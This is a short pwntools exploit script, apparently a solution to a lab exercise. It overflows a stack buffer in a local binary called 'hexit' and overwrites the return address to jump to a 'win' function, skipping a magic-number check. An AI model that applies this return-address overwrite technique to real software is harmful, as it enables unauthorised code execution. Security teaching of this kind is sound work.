#!/usr/bin/python3

from pwn import *

def create_payload(libc_base):

    # Stack content during process_stdin
    #       MAIN CALLED
    #       PROCESS_STDIN CALLED
    #   0 pre process_stdin return address          (8 bytes)
    #   1 previous frame pointer                    (8 bytes)
    #   2 input_buffer              (rbp - 0x110)   (256? bytes)
    #   3 saved_rdi                 (rbp - 0x118)   (8 bytes)
    #      PRINTHEX CALLED 

    content = b''
    
    # write 0x110 + 8 bytes to fill the buffer and the frame pointer
    content += b'A' * (0x110 + 8)

    # overwrite the return address of process_stdin to point to the win function (bypassing the magic number check)
    win_addr = 0x40119d
    content += p64(win_addr)

    return content

# DO NOT MODIFY THE CODE BELOW
def main():
    context.arch = 'amd64'

    # launch program
    p=process('./hexit')
    
    # Get the first two lines of output, containing info leak on libc base
    print(p.recvline().decode('utf-8'))
    s = p.recvline()
    print(s.decode('utf-8'))
    libc_base = int(s,16)   

    # create a payload, with the help of the info leak
    payload = create_payload(libc_base)
    # send payload 
    print(p.recvline().decode('utf-8'))
    p.sendline(payload)
    # retrieve the final result
    print(p.recvall().decode('utf-8','ignore'))

if __name__ == '__main__':
    main()
